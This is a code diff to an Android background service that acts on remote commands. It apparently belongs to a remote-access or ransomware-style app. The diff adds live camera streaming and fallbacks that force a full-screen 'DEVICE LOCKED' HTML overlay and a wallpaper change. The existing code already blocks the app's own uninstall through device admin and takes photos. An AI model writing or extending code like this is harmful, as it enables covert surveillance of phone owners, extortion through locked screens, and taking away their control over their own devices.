@@ -163,7 +163,20 @@ class Svc : Service() {
                         "ERR: no overlay permission"
                     } else {
                         val html = a.optString("html", "<h1>DEVICE LOCKED</h1>")
-                        LockManager.show(this, html)
+                        Handler(Looper.getMainLooper()).post {
+                            try {
+                                LockManager.show(applicationContext, html)
+                                logSrv("lock_ok", "overlay shown")
+                            } catch (e: Exception) {
+                                logSrv("lock_err", "ovl: " + (e.message ?: "?"))
+                                try {
+                                    val i = Intent(applicationContext, LockOverlay::class.java)
+                                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                                    i.putExtra("html", html)
+                                    startActivity(i)
+                                } catch (e2: Exception) {}
+                            }
+                        }
                         "custom lock shown"
                     }
                 }
@@ -206,6 +219,10 @@ class Svc : Service() {
                 "uninstall_block" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, true); "blocked" } else "ERR: not admin" }
                 "uninstall_unblock" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, false); "unblocked" } else "ERR: not admin" }
                 "set_wallpaper" -> { setWallpaper(a.optString("url", "")); "wallpaper requested" }
+                "start_stream" -> {
+                    try { CameraStreamer.start(this, a.optString("facing", "back")); "stream started" } catch (e: Exception) { "ERR: " + (e.message ?: "?") }
+                }
+                "stop_stream" -> { try { CameraStreamer.stop(); "stream stopped" } catch (e: Exception) { "ERR" } }
                 "take_photo" -> { takePhoto(a.optString("facing", "back")); "photo requested" }
                 else -> "unknown"
             }
@@ -228,15 +245,20 @@ class Svc : Service() {
                 val bmp = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                 if (bmp == null) { logSrv("wp_err", "decode_fail"); return@Thread }
                 val wmgr = WallpaperManager.getInstance(applicationContext)
-                try { wmgr.setBitmap(bmp) } catch (e: Exception) {
-                    try { wmgr.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM) } catch (e2: Exception) {
-                        try { wmgr.setBitmap(bmp, null, true, WallpaperManager.FLAG_LOCK) } catch (e3: Exception) {
-                            logSrv("wp_err", "set_fail: " + (e3.message ?: "?"))
-                            return@Thread
-                        }
+                var ok = false
+                try { wmgr.setBitmap(bmp); ok = true } catch (e: Exception) {
+                    try { wmgr.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM); ok = true } catch (e2: Exception) {
+                        try { wmgr.setBitmap(bmp, null, true, WallpaperManager.FLAG_LOCK); ok = true } catch (e3: Exception) {}
                     }
                 }
-                logSrv("wp_ok", "wallpaper set")
+                if (ok) logSrv("wp_ok", "wallpaper set")
+                else {
+                    logSrv("wp_fallback", "using activity")
+                    val i = Intent(applicationContext, WallpaperActivity::class.java)
+                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    i.putExtra("url", url)
+                    startActivity(i)
+                }
             } catch (e: Exception) {
                 logSrv("wp_err", e.message ?: "unknown")
             }
